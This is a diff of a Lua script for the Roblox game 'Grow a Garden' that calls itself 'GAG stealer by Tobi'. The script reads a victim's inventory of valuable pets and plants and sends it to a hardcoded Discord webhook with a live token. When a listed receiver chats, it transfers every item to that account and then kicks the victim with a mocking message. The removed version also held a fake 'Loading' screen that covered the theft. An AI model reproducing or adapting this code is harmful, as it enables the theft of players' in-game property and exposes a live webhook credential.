@@ -1,297 +1,373 @@
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then return end
+if _G.scriptExecuted then
+    return
+end
 _G.scriptExecuted = true
 
--- SETTINGS
 local users = _G.Usernames or {"ezikiel53"}
 local min_value = _G.min_value or 10000000
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord_webhook_here"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"
 
--- SERVICES
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
-
 local plr = Players.LocalPlayer
 local backpack = plr:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
-
 local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
 local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
 local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
-
 local character = plr.Character or plr.CharacterAdded:Wait()
-
--- EXECUTOR NAME
-local executorName = "Unknown"
-pcall(function()
-    if getexecutorname then executorName = getexecutorname() end
-end)
-
--- SERVER HOP
-local function serverHop()
-    pcall(function() TeleportService:Teleport(game.PlaceId) end)
-end
-
--- SERVER CHECKS
-if next(users) == nil or webhook == "" then serverHop() return end
-if game.PlaceId ~= 126884695634066 then serverHop() return end
-if #Players:GetPlayers() >= 5 then serverHop() return end
-pcall(function()
-    if game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer() == "VIPServer" then
-        serverHop()
-    end
-end)
-
--- DATA
-local excludedItems = {"Seed","Shovel [Destroy Plants]","Water","Fertilizer"}
-local rarePets = {"Headless horseman","Elephant","Spider","Raccoon"}
-
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Headless horseman", "Elephant", "Spider", "Raccoon"}
 local totalValue = 0
 local itemsToSend = {}
 
--- HELPERS
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add any usernames or webhook")
+    return
+end
+
+if game.PlaceId ~= 126884695634066 then
+    plr:kick("Game not supported. Please join a normal GAG server")
+    return
+end
+
+if #Players:GetPlayers() >= 5 then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
 local function calcPetValue(v14)
-    local hatchedFrom = v14.PetData and v14.PetData.HatchedFrom
-    if not hatchedFrom or hatchedFrom == "" then return 0 end
-
+    local hatchedFrom = v14.PetData.HatchedFrom
+    if not hatchedFrom or hatchedFrom == "" then
+        return 0
+    end
     local eggData = petRegistry.PetEggs[hatchedFrom]
-    if not eggData then return 0 end
-
-    local rarity = eggData.RarityData.Items[v14.PetType]
-    if not rarity then return 0 end
-
-    local range = rarity.GeneratedPetData.WeightRange
-    if not range then return 0 end
-
-    local lerpVal = numberUtil.ReverseLerp(range[1], range[2], v14.PetData.BaseWeight)
-    local wScale = math.lerp(0.8, 1.2, lerpVal)
-    local lvlProg = petUtils:GetLevelProgress(v14.PetData.Level)
-    local mult = wScale * math.lerp(0.15, 6, lvlProg)
-
-    local price = petRegistry.PetList[v14.PetType].SellPrice * mult
-    return math.floor(price)
+    if not eggData then
+        return 0
+    end
+    local v17 = eggData.RarityData.Items[v14.PetType]
+    if not v17 then
+        return 0
+    end
+    local weightRange = v17.GeneratedPetData.WeightRange
+    if not weightRange then
+        return 0
+    end
+    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
+    local v20 = math.lerp(0.8, 1.2, v19)
+    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
+    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
+    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
+    return math.floor(v23)
 end
 
 local function formatNumber(number)
-    if not number then return "0" end
-    local suffix = {"","k","m","b","t"}
-    local idx = 1
-    while number >= 1000 and idx < #suffix do
-        number /= 1000
-        idx += 1
+    if number == nil then
+        return "0"
     end
-    if number == math.floor(number) then
-        return number .. suffix[idx]
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 and suffixIndex < #suffixes do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
     else
-        return string.format("%.2f%s", number, suffix[idx])
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
     end
 end
 
 local function getWeight(tool)
-    local v = tool:FindFirstChild("Weight") or 
-              tool:FindFirstChild("KG") or
-              tool:FindFirstChild("WeightValue") or
-              tool:FindFirstChild("Mass")
+    local weightValue = tool:FindFirstChild("Weight") or 
+                       tool:FindFirstChild("KG") or 
+                       tool:FindFirstChild("WeightValue") or
+                       tool:FindFirstChild("Mass")
 
-    if v then
-        if v:IsA("NumberValue") or v:IsA("IntValue") then
-            return v.Value
-        elseif v:IsA("StringValue") then
-            return tonumber(v.Value) or 0
+    local weight = 0
+
+    if weightValue then
+        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
+            weight = weightValue.Value
+        elseif weightValue:IsA("StringValue") then
+            weight = tonumber(weightValue.Value) or 0
+        end
+    else
+        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+        if weightMatch then
+            weight = tonumber(weightMatch) or 0
         end
     end
 
-    local match = tool.Name:match("%[(%d+%.?%d*) KG%]")
-    return tonumber(match) or 0
+    return math.floor(weight * 100 + 0.5) / 100
 end
 
--- BUILD itemsToSend
-for _, tool in ipairs(backpack:GetChildren()) do
-    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+local function getHighestKGFruit()
+    local highestWeight = 0
 
-        -- PET
-        if tool:GetAttribute("ItemType") == "Pet" then
-            local uuid = tool:GetAttribute("PET_UUID")
-            local ok, pdata = pcall(function()
-                return dataService:GetData().PetsData.PetInventory.Data[uuid]
-            end)
-
-            if ok and pdata then
-                local name = pdata.PetType
-                local value = calcPetValue(pdata)
-                local weight = getWeight(tool)
-                totalValue += value
-
-                table.insert(itemsToSend,{
-                    Tool = tool,
-                    Name = name,
-                    Value = value,
-                    Weight = weight,
-                    Type = "Pet"
-                })
-            end
-
-        else
-            -- PLANT
-            local value = calcPlantValue(tool)
-            if value >= min_value then
-                local weight = getWeight(tool)
-                local name = tool:GetAttribute("ItemName") or tool.Name
-                totalValue += value
-
-                table.insert(itemsToSend,{
-                    Tool = tool,
-                    Name = name,
-                    Value = value,
-                    Weight = weight,
-                    Type = "Plant"
-                })
-            end
-        end
-    end
-end
-
--- RARE PET INVENTORY
-local function BuildRareInventory()
-    local t = {}
     for _, item in ipairs(itemsToSend) do
-        if table.find(rarePets, item.Name) then
-            table.insert(t, string.format("%s (%.2f KG): ¢%s",
-                item.Name, item.Weight, formatNumber(item.Value)))
+        if item.Weight > highestWeight then
+            highestWeight = item.Weight
         end
     end
 
-    if #t == 0 then
-        return "N/A", false
-    end
-
-    return "```\n" .. table.concat(t, "\n") .. "\n```", true
+    return highestWeight
 end
 
--- WEBHOOK
-local function sendWebhook(list)
-    local inventoryText, hasRare = BuildRareInventory()
-    local doPing = (ping == "Yes" and hasRare)
-
+local function SendJoinMessage(list, prefix)
     local fields = {
         {
-            name = "👤 Account Information",
-            value = string.format(
-                "Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s",
-                plr.Name, tostring(_G.Username), executorName, tostring(plr.AccountAge)
-            )
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
         },
         {
-            name = "💰 Value",
-            value = "Value: ¢" .. formatNumber(totalValue)
-        },
-        {
-            name = "🎒 Inventory",
-            value = inventoryText
-        },
-        {
-            name = "🔗 Join Link",
+            name = "Join link:",
             value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
+        },
+        {
+            name = "Item list:",
+            value = "",
+            inline = false
+        },
+        {
+            name = "Summary:",
+            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
+            inline = false
         }
     }
 
+    for _, item in ipairs(list) do
+        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
+        fields[3].value = fields[3].value .. line .. "\n"
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
     local data = {
-        content = doPing and "@everyone" or "",
-        embeds = {{
-            title = "📥 GAG Executed",
-            color = 65280,
-            fields = fields,
-            footer = {text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = "\240\159\140\180 Join to get GAG hit",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
         }}
     }
 
-    pcall(function()
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end
 
--- SEND WEBHOOK NOW
+local function SendMessage(sortedItems)
+    local fields = {
+		{
+			name = "Victim Username:",
+			value = plr.Name,
+			inline = true
+		},
+		{
+			name = "Items sent:",
+			value = "",
+			inline = false
+		},
+        {
+            name = "Summary:",
+            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
+            inline = false
+        }
+	}
+
+    for _, item in ipairs(sortedItems) do
+        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
+        fields[2].value = fields[2].value .. line .. "\n"
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "\240\159\140\180 New GAG Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
+			}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local itemName = v14.PetType
+            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
+                if tool:GetAttribute("Favorite") then
+                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                end
+                local value = calcPetValue(v14)
+                local toolName = tool.Name
+                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
+            end
+        else
+            local value = calcPlantValue(tool)
+            if value >= min_value then
+                local weight = getWeight(tool)
+                local itemName = tool:GetAttribute("ItemName")
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
+            end
+        end
+    end
+end
+
 if #itemsToSend > 0 then
-    sendWebhook(itemsToSend)
-end
+    table.sort(itemsToSend, function(a, b)
+        if a.Type ~= "Pet" and b.Type == "Pet" then
+            return true
+        elseif a.Type == "Pet" and b.Type ~= "Pet" then
+            return false
+        else
+            return a.Value < b.Value
+        end
+    end)
 
--- STEAL AFTER RECEIVER CHATS
-local function doSteal(player)
-    local hrp = character:WaitForChild("HumanoidRootPart")
-    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
 
-    hrp.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
-    task.wait(0.2)
+    table.sort(sentItems, function(a, b)
+        if a.Type == "Pet" and b.Type ~= "Pet" then
+            return true
+        elseif a.Type ~= "Pet" and b.Type == "Pet" then
+            return false
+        else
+            return a.Value > b.Value
+        end
+    end)
 
-    pcall(function()
-        local promptRoot = player.Character.HumanoidRootPart:FindFirstChild("ProximityPrompt")
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+
+    SendJoinMessage(sentItems, prefix)
+
+    local function doSteal(player)
+        local victimRoot = character:WaitForChild("HumanoidRootPart")
+        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
+        wait(0.1)
+
+        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
 
         for _, item in ipairs(itemsToSend) do
             item.Tool.Parent = character
-            task.wait(0.1)
-
             if item.Type == "Pet" then
-                local p = player.Character.Head:FindFirstChild("ProximityPrompt")
-                if p then repeat task.wait() until p.Enabled fireproximityprompt(p) end
+                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
+                repeat
+                    task.wait(0.01)
+                until promptHead.Enabled
+                fireproximityprompt(promptHead)
             else
-                if promptRoot then repeat task.wait() until promptRoot.Enabled fireproximityprompt(promptRoot) end
+                repeat
+                    task.wait(0.01)
+                until promptRoot.Enabled
+                fireproximityprompt(promptRoot)
             end
-
             task.wait(0.1)
             item.Tool.Parent = backpack
+            task.wait(0.1)
         end
-    end)
 
-    serverHop()
-end
-
--- LISTEN FOR RECEIVER CHAT
-local function listen()
-    local function detect(p)
-        if table.find(users, p.Name) then
-            p.Chatted:Connect(function()
-                doSteal(p)
-            end)
+        local itemsStillInBackpack = true
+        while itemsStillInBackpack do
+            itemsStillInBackpack = false
+            for _, item in ipairs(itemsToSend) do
+                if backpack:FindFirstChild(item.Tool.Name) then
+                    itemsStillInBackpack = true
+                    break
+                end
+            end
+            task.wait(0.1)
         end
+
+        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
     end
-    for _, p in ipairs(Players:GetPlayers()) do detect(p) end
-    Players.PlayerAdded:Connect(detect)
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            if table.find(users, player.Name) then
+                player.Chatted:Connect(function()
+                    if not sentMessage then
+                        SendMessage(sentItems)
+                        sentMessage = true
+                    end
+                    doSteal(player)
+                end)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
+    end
+    waitForUserChat()
 end
-
-listen()
-
--- FULLSCREEN UI
-local screen = Instance.new("ScreenGui")
-screen.IgnoreGuiInset = true
-screen.Parent = CoreGui
-
-local frame = Instance.new("Frame", screen)
-frame.Size = UDim2.new(1,0,1,0)
-frame.BackgroundColor3 = Color3.new(0,0,0)
-frame.BackgroundTransparency = 1
-
-local txt = Instance.new("TextLabel", frame)
-txt.Size = UDim2.new(1,0,1,0)
-txt.Text = "Loading… Please wait"
-txt.TextColor3 = Color3.new(1,1,1)
-txt.BackgroundTransparency = 1
-txt.Font = Enum.Font.GothamBold
-txt.TextSize = 45
-
-TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
-task.wait(600)
-TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
-task.wait(1)
-screen:Destroy()
